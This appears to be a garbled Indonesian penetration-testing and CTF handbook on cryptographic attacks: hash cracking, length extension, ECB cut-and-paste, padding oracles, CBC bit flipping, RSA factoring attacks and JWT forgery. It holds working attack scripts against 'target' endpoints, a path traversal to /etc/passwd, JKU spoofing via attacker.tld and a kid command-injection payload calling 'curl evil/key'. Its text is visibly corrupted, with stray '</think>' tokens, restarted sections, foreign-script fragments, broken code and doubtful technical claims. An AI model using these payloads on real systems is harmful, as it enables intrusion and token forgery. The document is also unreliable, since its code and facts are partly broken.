| bcrypt $2b$ / $2y$ | 3200 | PHP dan Node libsodium gunakan $2y$ | Hashcat **tidak peduli** prefix $2a/$2b/$2y — kompatibel |
| PDF 1.7 Acro6+ | 10700 | ` -m 10700`... | GPU limit; gunakan --gpu-temp-abort |
| MS Office 2013 | 9600 | SHA512 + AES极为慢 | ~5k H/s pada RTX 4090; set ekspektasi klien |

### korean Tip: Conditional Rule Output Debug
Debug tanpa GPU time:
```bash
# jalankan rule engine dan cek jumlah kandidat:
hashcat --stdout -r rules/d3ad0ne.rule wordlist.txt -a 0 | sort -u | wc -l
```

### Distributed Hashcat via S3 Prefix

```bash
# Split wordlist jadi segmen N dan paralelkan antar host — POTFILE WAJIB dishare:
hashcat -m 1000 hashes.txt seg01.txt --potfile-path s3fs-mount/shared.potfile
```

**Jebakan**: node lain tidak membaca pot baru, jadi ada re-kerja. Gunakan `--potfile-disable` + `--left` union di akhir; atau jalankan satu instance per `--skip/--limit`:
```bash
hashcat -m 1000 hashes.txt giant.txt --skip 0 --limit 100000000
hashcat -m 1000 hashes.txt giant.txt --skip 100000000
```

---

## 4.2.9 Length Extension / Hash Puzzle — Varian dan Kenaikan Kerumitan

### SHA-256/SHA-512 Berlapis: Layered Extension
Panjang ganda via PHP (hashing dua kali) TIDAK rentan terhadap length extension:
```php
$cookie = "user=adm\x80... E\x00\x00user=admin"  \xA8\xFE\x45\x1D\x99"....bugged byte not trivially variable
```

PENGGUNAAN:
```python
from Cryptodome.Hash import SHA256

original_signature = "d00d659d9290d1958d6c..."
forged_message     = forge(seg2_from_offset(64-len_from_signature)erg蛛
```

### MD4 Length Extension di Windows/NTLM context — Diabaikan oke.

---

## Bab lanjutan Lain yang masih relevan isi materi 20%

## 4.c Instructor pilot written length--extension attack hash length extension finder

## virus warning: real-world uses are common in internal token signing - watch for  `sha256(secret || input)` pattern in:
- **Flask signing abuse**
- cookies  PHPSESSID subdomain forgery
>herniated usually in CN/Jurisdiction cases when token is base64-hashed and not HMAC

----

**muat nonce</think>## 4.2.9 Length Extension Attack — Varian Lanjutan

### Perbedaan Per Keluarga Hash

| Hash | Rentan LEA | State size (byte) | Block (byte) | Catatan |
|---|---|---|---|---|
| MD5 | Ya | 8 | 64 | Padding manual klasik |
| SHA-1 | Ya | 8 | 64 | |
| SHA-256 | Ya | 8 | 64 | |
| SHA-512 | Ya | 8 | 128 | Block beda — skrip generik salah di sini |
| SHA-3 | **Tidak** | — | — | Sponge construction, state internal tidak direcovery dari digest |
| BLAKE2/2s/3 | Tidak | — | — | |
| SHA-384 | Rentan *dengan caveat* | 8 (dari 16 keluar 12 byte output) | 128 | Digest dipotong — state tidak lengkap, tapi output 48 byte tetap cukup untuk rekonstruksi internal state (lihat paper Stevens) |

**Jebakan**: banyak tutorial online memberi script LEA dengan `block_size=64` hardcoded. SHA-512-family memakai 128. Selalu cek `hashlib.new(algo).block_size`.

```python
import struct

def md5_padding(msg_len):
    # msg_len dalam BYTE, bukan bit
    pad = b'\x80'
    pad += b'\x00' * ((56 - (msg_len + 1) % 64) % 64)
    pad += struct.pack('<Q', msg_len * 8)   # little-endian untuk MD5
    return pad

def sha256_padding(msg_len):
    pad = b'\x80'
    pad += b'\x00' * ((56 - (msg_len + 1) % 64) % 64)
    pad += struct.pack('>Q', msg_len * 8)   # big-endian untuk SHA-2
    return pad
```

**Endianness edge case**: MD5/MD4 = little-endian untuk length field; SHA-1/SHA-2 = big-endian. Skrip yang "benar dua-duanya" hampir selalu typo pada field ini.

### Deteksi Blind LEA (signature tak terlihat)

Ketika aplikasi membandingkan server-side tetapi response-nya hanya valid/invalid binary:

```python
import requests, hashpumpy, binascii

base_sig = None
for extra in [b'', b'a', b'aa']:
    # endpoint validasi: boolean oracle
    sig = oracle_extend(base_sig, len(secret_guess), extra)
    if oracle_validate(sig, extra):
        print(f"secret_len kandidat saat glue={len(extra)}")
```

Kamu perlu menebak **panjang secret** (bukan isinya). Loop 1..64 dan test signature forged dengan payload `admin=true`. Praktik:

```python
# pip install hashpumpy
import hashpumpy, urllib.parse

orig_sig = "d94cd493d175...".decode('hex')
orig_msg = b"user=bob&role=user"
append   = b"&role=admin"

for secret_len in range(1, 65):
    new_sig, new_msg = hashpumpy.hashpump(orig_sig, orig_msg, append, secret_len)
    r = requests.get(f"https://target/verify?sig={new_sig}&data={urllib.parse.quote(new_msg)}")
    if "OK" in r.text:
        print(f"[+] Secret length = {secret_len}")
        break
```

### length extension di Filename ("%00 padding via URL")

Template `sha256(SECRET + filename)` untuk unduh file — tambah dengan path traversal:

```
Forged: /download?name=cache/payload&sig=EXTENDED_SIG
Message server-side: SECRET || cache/payload\x80...\x00[panjang]...../../../etc/passwd
```

Path traversal setelah padding SUDAH melewati parsing server jika server membangun `open(base + name)` tanpa sanitasi ulang setelah validasi signature. Ini prinsip: **signature check pass, lalu parsing dilakukan pada data yang "tengah" padding-nya — aplikasi yang split pakai terminator `\x00` bisa bypass jika language tidak stop at NUL.**

---

## 4.2.10 ECB Cut-and-Paste — Case Studi Lanjutan

### Deteksi ECB Tanpa Akses Ciphertext Kontrol

ECB deteksi biasa butuh plaintext control (encrypt-oracle). Waktu itu tidak ada, cek repetitive pattern pada ciphertext:

```python
import collections

def guess_mode(c: bytes) -> str:
    blocks = [c[i:i+16] for i in range(0, len(c), 16)]
    dupes = [b for b, n in collections.Counter(blocks).items() if n > 1]
    return f"probability_ECB={len(dupes)/max(len(blocks),1):.2f}"
```

Image profile JPEG irisan kecil (mis. `3 < 0.05`), tapi PNG struktur header tidak dedup — kalau dedup ratio tinggi di ciphertext file image, mode ECB.**Gunakan tool visual: `santa-ecb.py` menggambar ciphertext sebagai pixel map, blok berulangnya jadi pola "SQLite" — sangat efektif untuk laporan klien.**

### Toleransi Serialize: Format Handle Padding Block

Cut-paste pada serialized client-cookie umumnya menggunakan format **JSON**.
Masalah: JSON punya bytes didepan (seperti `{"`), jadi cut-and-paste bisa berantakan karena bidang-bidang harus tetap aligned.

Pertanyaan: apakah byte pertama file aligned начале cookie persis di boundary 16-byte block?

Teknik: **byte-shift untuk re-align**

```
Plaintext overall:   [Block0: "{"user":"bob","ro][Block1: le":"admin0GP..."]
Target cookie:       {"user":"bob","role":"admin0padding_x0000"}
Ciphertext:          [E({"user":"bob","ro)][E(le":"admin0PAD_)][E(xxxxxxxxxxxxxxxx)]
```

Untuk cook**JSON**: cleaner route adalah insert via property yang× control.
Encoder</think>## 4.2.10 ECB Cut-and-Paste — Format JSON & Alignment

### Masalah Alignment di JSON

Cookie profil biasanya `{"user":"bob","role":"user"}`. Karena karakter kontrol JSON, cut-and-paste klasik butuh byte pertama field persis di boundary block. Solusi: **pad palung username dengan karakter valid JSON** untuk menggeser alignment.

```
Target construct (block = 16):
{"user":"aaaa    | aaaaaaaa","adm|in":"xxxxxxx"  ← tidak, ini masalah quoting
```

Pendekatan yang benar — buat role "tergeser" masuk block penuh:

```
Requested: {"user":"BBBBBBBBBBBBBBBBBBBB","role":"user"}
Blocks:    [0000000000000000][1111111111111111][2222222222222222]

Kalau encrypt endpoint membalikkan dengan role kontrol full:
{"user":"AAAAAAAA","role":"admin"}     ← pair yang diinginkan
{"user":"AAAAAAAAadmin","role":"user"} ← role ter-inject
Karena ECB: block yang mengandung `,"role":"admin` dalam second adalah identik antar-request (asal alignment sama)
```

Skrip builder meta:

```python
import requests
BS = 16
BASE = "https://target/profile"

def enc(pt):
    return requests.post(f"{BASE}/new", json={"data": pt}).json()["ct"]

# 1. geser alignment: find prefix length sehingga ",\"role\":\"adm" dimulai tepat di kelipatan 16
def find_shift():
    for L in range(BS):
        pt = "A"*(L) + ',\"role\":\"admin\",\"x\":\"'
        ct = enc(pt)
        # blok ke-(L//16+1) memuat role bagus → dia index -3 of data
        # confirm oleh oracle: submit role as separate user data; jika ct contains same block, jackpot
        ...

# 2. cut target: original cookie user real "user":"user"
target_blocks = [bytes.fromhex(enc_stored)[i:i+BS] for i in range(0, len/16)]
# 3. paste:
forged = target_blocks[:2] + admin_block
```

### Edge Case Baru: AES-ECB di .NET "Rijndael" default mode

.NET Framework `RijndaelManaged` default mode **CBC**, bukan ECB — tapi banyak legacy code eksplisit set `CipherMode.ECB`. Quick fingerprint server-side: kirim dua request identik bersebelahan. ECB: ciphertext blok berulang identik. CBC dengan IV acak: ciphertext berbeda tiap kali — **CBC dengan fixed IV juga menghasilkan prefix identik**, jadi bedakan: blok **kedua** juga identik → ECB; hanya blok pertama identik → CBC fixed-IV.

### ECB pada GZIP/ZIP sebelum Enkripsi

Java pattern umum: `ECB(Gzip(json))`. Gzip menambahkan header + footer — cut-paste block tetap bekerja, tapi kandidat block yang dipindahkan **harus whole-Gzip-valid**? Tidak — footer checksum Gzip hanya valid jika yang kita ambil adalah body. Trik: paste semua block kecuali 8-byte footer terakhir, tulis ulang trailer Gzip sendiri (CRC32 + size dari payload original).

Perintah cepat validasi hasil:

```bash
# Decrypt forged ECB cookie, decompress
python3 -c "
import gzip
from Crypto.Cipher import AES
ct = open('forged.bin','rb').read()
pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
# strip padding manual — Gzip deteksi otomatis footer
print(gzip.decompress(pt).decode())
"
```

---

## 4.2.11 Padding Oracle — CBC Beyond "P52"

### Timing-Resistant Padding Oracle

Jika perbedaan respons 200 vs 500 **terlihat dari timeline beberapa ms saja**, gunakan baseline timing berulang untuk klasifikasi stokastik:

```python
import time, statistics

def oracle_avg(c, sess, n=40):
    ts = []
    for _ in range(n):
        t0 = time.perf_counter()
        requests.post(oracle_url, cookies={"sess": b64(c)}, timeout=5)
        ts.append(time.perf_counter() - t0)
    return statistics.median(ts)

# ambil sample untuk klasifikasi "invalid padding" vs "invalid MAC"
t_invalid_pad = oracle_avg(row_zero)     # c yang sengaja ter-corrupt
t_invalid_mac = oracle_avg(row_good_pad_bad_data)
# threshold = (median_1 + median_2)/2 * safety
```

Bandingkan: padding error terjadi lebih awal (decrypt gagal di block check) vs MAC check error — bila MAC check dulu dilakukan, ORACLE TIDAK ADA (Encrypt-then-MAC benar). Ini penting — cek urutan server response: error "decryption" sebelum "bad signature" = vuln.

### Varian Protokol & Produk Spesifik

| Konteks | Eksploit khas | Catatan |
|---|---|---|
| ASP.NET Legacy WebResource.axd | POET2002-style reflection | Padding error sampai .NET 4.5.2 — bisa enable `machineKey` injection |
| Java `PKCS5Padding` default exception | `BadPaddingException` ter-expose → boolean oracle | Jangan tangkap exception global — leak informasi |
| Ruby Rack session cookie 1.x | Marshal Deserialization setelah padding success | Kombinasi padding oracle + RCE melalui gadget `Marshal.load` |
| JS crypto di node `createDecipheriv` | `wrong final block length` vs `error:1e000065` perbedaan error class | Gunakan stdout capture difference |
| IPsec / TLS 1.0 CBC | Lucky 13 vs POODLE | TLS 1.0 check internal — timing attack advanced, gunakan pyLucky13 framework |

### POODLE SSLv3 Practical Check

```bash
# deteksi via openssl s_client apakah fallback SSL3 masih aktif
openssl s_client -connect target:443 -ssl3
# jika handshake sukses → POODLE usable (plus CVE-2014-3566 extension, MAC bypass via padding byte terakhir)
```

Modern OpenSSL (1.1.0+) **menolak SSLv3 di build default** — clien pun disable. Untuk engagement verificaiton legacy: recompile dengan `enable-ssl3` atau gunakan BoringSSL build lama. Catat ables di laporan.

### POODLE TLS (CVE-2014-8730) pada SSLv3

Kebanyakan tool standar check SSLv3 saja. Banyak server masih SSL3 via **TLS_FALLBACK_SCSV missing** — cek itu juga:

```bash
testssl.sh -R target:443   # RFC 7507 fallback SCSV support
```

### AES-NI dan Concurrency — Practical Speed Table

Padding oracle decrypt 1 block butuh hingga 256×16 request worst case. Over framework Python single-thread lama. Gunakan async reverse byte-by-byte, parallelize bytes (kecuali byte terakhir — serial per block):

```python
import asyncio, httpx

async def probe(client, c_forge, byte_idx, guess):
    # build modified R-block and submit
    r = bytearray(prev_block)
    # pad validation byte: xor
    r[-(i+1)] ^= guess ^ pad_val
    ...

async def main():
    async with httpx.AsyncClient() as client:
        # biasanya byte terakhir di-serial; bytes berikutnya bisa parallel per-value
        tasks = [probe(client, c, i, g) for i in range(1,16) for g in guesses]
```

**Jebakan praktis**: kalau rate limiter butuh 429 backoff, decrypt 32-byte makan 8 jam. Negosiasi scope — atau request rugi dari rate-limit-friendly-path (endpoint log tidak menghitung cache path).

### Gascon "STOP SBYTE method" — ISR-FAST

Jika oracle memungkinkan valid-oracle detection via cache lokal server (curl keep-alive reuse), packets per-guess turun ~50% vs new connection per guess. Maintain connection pool via httpx.

---

## 4.2.12 CBC Bit Flipping — Advanced Scenarios

### Menyuntik Karakter Kontrol & Bypass Filter

Trus classical: tambahprefix sampai panjang kelipatan block. Tetapi ketika plaintext dibalikan — nilai corupt XOR perlu menebak offset tetapi plaintext bagian sebelah jadi gumpalan rusak. **Untuk bypass kadang tidak diperlukan plaintext lain sinkrit — hanya important field pertama**: korpsis bit di `role-admin` blok kedua merusak blok pertama (username), tetapi server hanya care role. Skrip produksi:

```python
def bitflip(ct, position_target, desired_char, current_char):
    # ct: ciphertext (bytes), block_size 16
    # position_target: index of plaintext byte TO BE MODIFIED (integer)
    block_idx  = position_target // 16
    offset     = position_target % 16

    ct = bytearray(ct)
    # position that we need to flip in PREVIOUS ciphertext block:
    src = block_idx * 16 - 16 + offset   # equivalent: (block_idx-1)*16 + offset
    ct[src] ^= ord(desired_char) ^ ord(current_char)
    return bytes(ct)
```

**Trap**: jika desired-plaintext lebih panjang dari current (contoh role `user`→`adminx`), plaintext harus punya padding byte yang ter-XOR jadi garbage. Chain with **CBC segment corupt count**: preparation step membutuhkan plaintext alignment diketahui. Jika tidak diketahui — chain dengan **padding oracle** untuk memvalidasi forged ciphertext di klien lokal (mock decrypt) daripada submit berulang ke server.

### CBC Bit Flipping pada First Block — GY

First block **tidak bisa diflip** melalui previous-disturb karena tidak ada block sebelumnya — jika sistem punya IV transmit-access, IV-flipping merusak first block pada precise bytes: `iv[i] ^ newChar ^ currentChar`.

Jebakan: **IV sering permuted HMAC-signed immutable cookie stream** — roping IV break = authentication tag fail. Bila system Encrypt-then-MAC penuh, CBC bit-flipping tidak berguna — cek `Tag` field sebelum coba.

### Di Balik Cookie: Penggunaan non trivial — SAML +igned Response

SAML Response melalui `Ans` base64+deflate intransit jika terdapat weak crypto klien — memerlukan careful handling:
- Decrypt(dengan secret obtained via vuln), modifikasi bypass `Audience  Restricted`, plain label pairs... [performance data removed]
Serangan real-world: attacker replace URL QA→ **Dilakukan** via URLencode of `</saml2p:Response>` fixed by using deflate headers cut. ||
| ISO

### Steganografi Edge Case 2023 — AES-GCM saat filing clerk misconfig

Penuh independen — tetapi surveil modal  GCM nonce reuse adalah kelas serangan stabil permanen ditemaniAL custom ketika system serial: generator XOR write antar plaintexts — differing keystream disclosure.

snapshot AES-GCM nonce reuse check on ciphertext outputs:

```python
# kalau ada 2 ciphertext dengan nonce sama (kychain visible in transport):
pt_diff = xor_stream(c1, c2)
knownGuess = "-----BEGIN"  # email/file magic — crib drag kt
```

**Known ciphertext prefix** (file format Magic bytes) metode crib-drag jelas: `png = "\x89PNG\r\n\x1a\n"` first 8 bytes reveal keystream, XOR apply pada block relativme lain maka plaintext muncul.

### Pigeon reuse detection via ciphertext length

Nonce reuse attaache requires ciphertexts have same prefix alignment — length identik doesn't prove reuse; but **ciphertext blocks are XORED keystream**, if two blocks are exactly equal at offset X-Y — flag — list possible keystream reuse → cross pt check crib drag.

semi

---

## Interrupting sequence — continuing RSA entities context

## 4.2.13 RSA Shared Prime / Batch GCD — Container Cloud Impacts

Dalam cloud instance metadata (multi-tenant) atau embedded devices — vas populates keys where TRNG entropy poor:
- Duplicated primes **between keys** — gcd(N1, N2) > 1 → modulus faktor trivially:
```python
from math import gcd
p = gcd(N1, N2)
if p > 1: q1 = N1 // p; q2 = N2 // p  → private keys both obtained
# continue factor with p
q = N_x // poisoned_factor
d = pow(e, -1, (p-1)*(q-1))
```

Untuk batch scanning (miliar moduli dari CT log/Censys):
```bash
# pip install roca-detect   atau manual:
python3 batchgcd.py keys/moduli_list.txt -o cracked.txt
```

**Varian produk perilaku**: ROCA (Infineon/RSALib) affects smartcards (YubiKey 4 firmware < 4.3.5), TPM ASUS/HPE servers, Estonia eID batch 2017. Test fingerprint cepat:
```python
# fingerprint ROCA tanpa exploit keys, cukup modulus
def is_roca(N):
    # test small primes set characteristic of Infineon structure
    PRIMES_PATTERN = [97,193,193,65537,257,641 ...]#; actual constants in roca-detect package
    ...
```

Gunakan `ROCA-Fingerprint` tools — `pip install roca-detect` then `rocan --nested` dari N hex.

### Common Modulus Protocol Issue — Enterprise side

Skenario masa nyata: enterprise HR portal shares same modulus N across role keys oAuth grant wrapping keys — certificate key or root → extract key with different exponents common attack:

$$d = e_1^{-1} ext{mod} φ$$

$$m \equiv c_1^{h_1} c_2^{h_2} \bmod N, \text{ dengan } e_1 h_1 + e_2 h_2 = 1$$

```python
def common_modulus_attack(c1, c2, e1, e2, N):
    g, h1, h2 = extended_gcd(e1, e2)
    if g != 1: raise ValueError("exponents not coprime")
    if h1 < 0: c1 = pow(c1, h1 % ((N.bit_length()) - 1), N)  # trick dengan pure Python negative exponent
    m = (pow(c1, h1, N) * pow(modinv(c2, N), -h2, N)) % N  # hati² negatif handling
    return m
```

Tanda **enterprise positive common modulus surface**: public key **e sama, N sama** di endpoint yang berbeda (device provisioning, versioning) — scan langsung dengan SSH-keyscan + quick diff:
```bash
for host in $(cat hosts.txt); do
    ssh-keyscan -t rsa $host 2>/dev/null | awk '{print $3}'
done > keys.b64
# Compare N across hosts
awk '{ print $1 }' keys.b64 | uniq -d
```

**Jebakan operational**: certificate user vs server SSH hostkey sering N berbeda meskipun tool merge output — pair key HANYA jika modulus identik (compare modulus hex / base64 terms exact match).

### Besar-N Linear Edge — Od and特殊的 e parameter

Small e — kondisi dictionary classic: m^e < N maka m^e root integer plain.

```python
# targeted for e=3: root exact integer
from Crypto.Util.number import long_to_bytes
m, exact = iroot(c, 3)
if exact: print(long_to_bytes(m))
```

JEBHALL e=3 with padded message requires padding oracle context (see 4.2.11) — message dekat-level attack.

Coppersmith short-pad multi target (Franklin-Reiter):
```python
# sage
P.<x> = PolynomialRing(Zmod(N))
g1 = (x+M1)^3 - C1
g2 = (x+M2)^3 - C2  # relative offsets
g = g1.monic() ...
```

### Wiener Attack Length Condition

Don't worry — condition d < (1/3)N^(1/4) approximation. Betul **e d ≡ 1 mod φ** and Wiener works but developer large d -- modern starts fine → continued fraction convergents brings:

```python
def wiener(e, n):
    # Legendre: d < (1/3)*n^(1/4) kecil relatif
    cf = continued_fraction(e/n)
    for k, d in cf.convergents():
        phi = (e*d - 1) // k
        # check: is phi actually valid? discriminant perfect square
        s = n - phi + 1  # = p+q
        disc = s*s - 4*n
        if disc > 0:
            r = isqrt(disc)
            if r*r == disc:
                p = (s + r) // 2
                q = (s - r) // 2
                if p*q == n:
                    return d, p, q
```

Validation muncul melalui discriminant check — buka otomatis phi forge positive square case. Jika tidak square → next convergent. **Jangan** decrypt massive message when sudah recovered small-d captcha policies, apply direct.

**Tool cepat**: `RsaCtfTool` — Swiss army:
```bash
python3 RsaCtfTool.py --publickey key.pub --attack wiener --private
# list attack otomatis semua (wildcard mode):
python3 RsaCtfTool.py --publickey key.pub --attack all --private
```

Attacks list built-in (subbab): `wiener, hastad, common_modulus, small_q, fermat, pastctfprimes, pisano_period, londahl, system_primes_gcd, squfof, mersenne_primes, boneh_durfee, ecm, qicheng, qicheng2, shor_broadberry_nielsen, all`

**Boneh-Durfee** perlu env Sage — implementasi Richard Bonner — edge case when Wiener bound exceeded not far: d < N^0.292 — gunakan ketika d gagal Wiener. Perlu file `boneh_durfee.sage` runs in SageMath environment:
```bash
sage boneh_durfee.sage 0.292 300 bits 1.txt
```

### Hastad broadcast attack — batch message scenario

Skenario: perusahaan broadcast bonus payroll mail ke 3 grup recipients — public numpy e=3:
k recipients with **message padded with different fixed coefficients** — linear **Håstad** cases:

$$C_i = (a_i m + b_i)^3 \bmod N_i$$

```python
# Coppersmith method via sage:
# pip/sage -c build matrix, CRT combine, small_roots
def hastad_broadcast(ciphertexts, a_coeffs, b_coeffs, N_list):
    e = 3
    # Combine via CRT
    T = combine_crt(ciphertexts, N_list)
    A = combine_crt(a_coeffs, N_list)
    B = combine_crt(b_coeffs, N_list)
    # polynomial g(x) = (A x + B)^e - T over mod N_total
    P.<x> = PolynomialRing(Zmod(N_total))
    g = (A*x + B)^e - T
    roots = g.small_roots(X=2^(256), beta=1.0)  # plaintext bound
    return roots[0]
```

No-padding equal message `m` direct Hastad classical: CRT on c_i mod N_i, take integer cube root. Tools included in RsaCtfTool with flag `--attack hastad`.

```bash
# CTF style instance set up:
RsaCtfTool.py --publickey key1.pub --publickey key2.pub --publickey key3.pub \
  --attack hastad --decrypt ciphertext.bin
```

### Fermat / close prime factors (p,q close to each other) — enterprise key gen bug

GENERATOR UNIFORM p ← random, q = next_prime(p + small_delta) — kasus real: IoT vendor with limited entropy using fixed prime gap:

```python
from gmpy2 import isqrt, is_square

def fermat_factor(N):
    a = isqrt(N)
    if a*a < N: a += 1
    for i in range(100000):
        b2 = a*a - N
        if is_square(b2):
            b = isqrt(b2)
            return int(a-b), int(a+b)
        a += 1
```

Fermat works when `|p - q| < N^{1/4}` roughly—about a couple thousand iterations — usually completes instantly. Verify enterprise certs with:
```bash
# quick numeric test client-side online certs
openssl x509 -in cert.pem -noout -text | grep -i modulus
```

### Fermat plus ROCA pattern — chain finding in the wild found operational user certificates where│both factors generated from Infineon seed → use Roca `detect.py` -> confirm, then factor N directly recovery private key at**https://keychest.net/roca-detect** upload CSR/public moduli.</think>## 4.2.13 RSA — Varian & Edge Case Lanjutan

### Boneh–Durfee (Melebihi Batas Wiener)

Batas Wiener: d < N^0.25. Boneh–Durfee memperluas hingga **d < N^0.292**. Kapan pakai: Wiener gagal tapi d masih "secara kebiasaan kecil" (developer gen d dengan 512-bit untuk N 2048-bit).

```bash
# RsaCtfTool wrapper
python3 RsaCtfTool.py --publickey target.pub --attack boneh_durfee --private
# native: jalankan dalam SageMath
sage boneh_durfee.sage  # implementasi b-re collisions penting: delta=0.292
```

**Jebakan**: Boneh–Durfee butuh lattice LLL; hasil tidak deterministik untuk d di zona abu-abu 0.285–0.292. Coba `m` dan `t` parameter berbeda (m=3..6) sebelum menyatakan gagal.

### Fermat Factorization (p, q Berdekatan)

Terjadi ketika keygen melakukan `q = next_prime(p)` — vendor IoT/domain erpa:

```python
from gmpy2 import isqrt, is_square, mpz

def fermat(n):
    a = isqrt(mpz(n))
    if a*a < n: a += 1
    for _ in range(1_000_000):
        b2 = a*a - n
        if is_square(b2):
            b = isqrt(b2)
            return (a-b, a+b)
        a += 1
```

Berhasil saat |p−q| < N^0.25 / faktor dalam ~magic range. **Deteksi cepat tanpa full crack**: kalau N 2048-bit dan hasil iterasi > 10⁴, dual core — pindah teknik.

### Batch GCD / Shared Prime antar Cert dari Certificate Transparency

Scan massal enteprise:

```bash
pip install batch-gcd
# kumpulkan modulus dari crt.sh / censys
python3 batchgcd.py moduli.txt -o shared.txt
```

Bent-bent jebakan: cert renew (faktor sama karena key reuse) vs shared prime (faktor **salah satu** sama). Yang pertama bukan attack baru; yang kedua fatal. Bedakan dengan cek full N:
- N identik antar sertifikat → key reuse, bukan shared prime
- N beda, gcd(N1,N2) = p > 1 → shared prime vulnerability

### ROCA (Infineon) Fingerprint — Tanpa Faktor

Perlu **hanya public modulus N** untuk mendeteksi. Perangkat terdampak: YubiKey 4 fw <4.3.5, banyak TPM, beberapa smartcard, HPE iLO, Estonia eID (batch 2017):

```bash
pip install roca-detect
python3 -m roca.detect --nested file pubkeys.txt  # fingerprint each key
```

Kalau ROCA-positive → faktor N dalam waktu praktis (menit–jam di cloud), bukan "komputasi 128-bit" klasik.

### Key Formats & Konversi Cepat (Operasional — Sering Menyita Waktu)

```bash
# dari PEM ke semuanya:
openssl rsa -pubin -in pubkey.pem -text -noout          # lihat n, e langsung
openssl rsa -in privkey.pem -pubout -out pubkey.pem     # ekstrak public dari private

# RSA raw Python dari file DER:
openssl rsa -pubin -in key.pem -outform DER -out key.der
python3 -c "
from Crypto.PublicKey import RSA
k = RSA.import_key(open('key.der','rb').read())
print('e =', k.e, ' n bits =', k.n.bit_length())"

# ciphertext ke integer:
python3 -c "print(int.from_bytes(open('ciphertext.bin','rb').read(),'big'))"
```

**Jebakan**: `openssl rsa -text` menampilkan modulus dalam hex dengan `:` separator — pipe:
```bash
openssl rsa -pubin -in k.pem -text -noout | grep -A256 'Modulus' | tr -d ' :\n' | sed 's/^Modulus//' | head -c -16
```
(sesuaikan cut trailing "Exponent" chunk — format OpenSSL 3.x menampilkan "Exponent:" padat di akhir modulus).

### PPC / Misc Edge Cases: n until p+q leak via partial key disclosure, ciphertext c = m always m'self root, e=1 direct m, multiple N related d subjects — baca lengkap: "Practical Cryptography for Developers" + Ukhal duhovski unlocking attack candidates inventory from RSA list Hacktricks.</think>## 4.2.14 JWT Crypto Abuse — Lanjutan

### Orisinal vs Tabrakan Parameter Header Modern

Tabel varian bypass by library:

| Serangan | Header JSON | Library yang pernah vuln | Catatan |
|---|---|---|---|
| alg:none | `{"alg":"none","typ":"JWT"}` | py-jwt lama, node-jsonwebtoken <0.3.0 | `jsonwebtoken` modern menolak; perlu `algorithms: ["none"]` eksplisit — jangan |
| HS/RS confusion | `{"alg":"HS256"}` dengan RS256 pubkey sebagai HMAC secret | node-jsonwebtoken, pyjwt < 1.4.2 (CVE-2016-10555) | Public key PEM (termasuk newline) adalah secret |
| KID injection SQLi | `{"kid":"1' OR '1'='1"}` | library dengan kid dipakai query DB langsung | |
| KID path traversal | `{"kid":"../../../../dev/null"}` | pyjwt verify dengan `open(kid)` pattern | Bypass: sign dengan secret kosong file `/dev/null` |
| KID command injection | `{"kid":"key -x 'curl evil/key \'"}` | jose libs calling shell | RCE tertulis langsung |
| JWK header injection | `{"jwk":{"kty":"RSA",...,"n":...}}` | jjwt, certain Java lib yang trusting embedded keys | Kirim public key sendiri di header |
| JKU (JWK Set URL) | `{"jku":"https://attacker.tld/keys"}` | libs yang fetch JWKS tanpa trustlist domain | Host JSON `{"keys":[{...our key...}]} other sign token |
| X5U/X5C injection | `{"x5u":"http://evil/x.pam"}` | Java libs | X5C inline cert chain — sertifikat self-signedByPASS certificate validation |
| Embedded keys key_content |FastJwt context embedded key used | jose gem ruby leveraged |

### JKU — JWKS Spoof Praktis Siap Pakai

```python
# generate attacking keypair
import jwt
from jwt import PyJWK
priv = jwt.rsa.GenerateRSAKeyPair()  # or use Crypto.PublicKey.RSA
# fake JWKS hosted dserver
jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "vulnerable-key",
        "use": "sig",
        "n": b64u(priv["n"]),
        "e": "AQAB",
    }]
}
open("jwks.json","w").write(json.dumps(jwks))

token = jwt.encode({"user":"admin"}, priv_pem, algorithm="RS256",
                   headers={"kid":"vulnerable-key", "jku":"https://attacker.tld/jwks.json"})
```

**Jebakan deteksi server**: banyak middleware men-allowlist domain jku terhadap suffix-mismatch (mis. `evil-target.com.attacker.tld`) — cek subdomain wildcard assumption. Auth0 versi lama memeriksa hanya bahwa bilangan ASYMMETRIC berbeda — full report referensi: `vulnerabilità Jku Case`:
- Laporan dari PortSwigger — "Abusing JWT public keys"
- Agar tetap bersemangat update: cek penandaan JWKS Thumbprint (RFC 8755) yang pings resolvable against key namespaces.

### Algorithm Confusion ECDSA→HMAC (kunci "secret sama" ECDSA Publik)

Varian bangetreck: kunci EC publik `P-256` dipakai sebagai HMAC-SHA256 secret. Muncul saat API dev menyimpan same metadata crash. multimodal deteksi konteks: header assessment via OPTIONS HTTP debug endpoint `/jwks.json` atau file config JS frontend (`asset-manifest` dev keys).

Kuncinya harus representasi PEM atau raw point:

```python
import jwt, binascii
# kunci publik EC PEM
ec_pem = open('ec_pub.pem').read()
secret_hmac = ec_pem  # RETRY possible: raw point base64url compressed

# coba negotiate ul headers
tok1 = jwt.encode({"sub":"admin"}, secret_hmac, "HS256")
# Jika gagal—dengan library strict: jwt.decode token with verify signature with asymmetric and der PUBLIC KEY type statement cases
```

### Nested JWT (JWE within JWS) — Pitiğfall

Beberapa API ganda-encode: `JWE(JWS(payload))`. Token di sisi luar tampak "Encrypted" — tetapi JWS dalam sering men-spawn HS/RS signed subtoken vulnerable. Saat validasi hasil, jangan percaya  header luar saja untuk audit — decode JWE (sering `dir` algorithm key reuse) gunakan library jwcrypto:

```python
from jwcrypto import jwk, jwt as jwjwt
key = jwk.JWK.from_password(b32decode)
t = jwjwt.JWT()
t.deserialize(token)
# nested JWT lookup:
inner = t.token.part
```

Node.js library **node-jose** older version: supports `A128GCM` but previously not mandatory content-encryption validation — plain nested sign bypass cek kunci kecil size (sent 64 bits key? silently accepted).

### Divergent library behavior on `exp`, `nbf`, `iss` claims handling

**pyjwt**: raised ketika exp dan `iss` miss expectation, prior `-1` val → critical issue in lama `decode()` without algorithms list.
**jsonwebtoken Node**: buffering `maxAge` option — `0` maxAge means bypass time check when combined `ignoreExpiration: false` default? Note: **whenever option set null** — library defaults flags EXPIRES FALSE declare — quick checks `npm audit signatures library flags` not validated, anything else may be used **null-based flag "ignore" kebebasan exp**.

EA perintah otomatis lexer:

```bash
jwt_tool <token> -X a  # alg:none auto bypass
jwt_tool <token> -X k  # key-confusion attack jika public key tersedia
jwt_tool <token> -X n  # null signature attack (padding kosong)
jwt_tool <token> -X i  #inject jwk header key
jwt_tool <token> -X u <https://attacker.tld/jwks>   # jku claim
```

### Mencegah regeneration lost: audit checklist operational — JWT Crypto Use

1. `alg` harus disertakan explicit di list; set iteration "jangan reflek accept HS256 fallback über andere'."
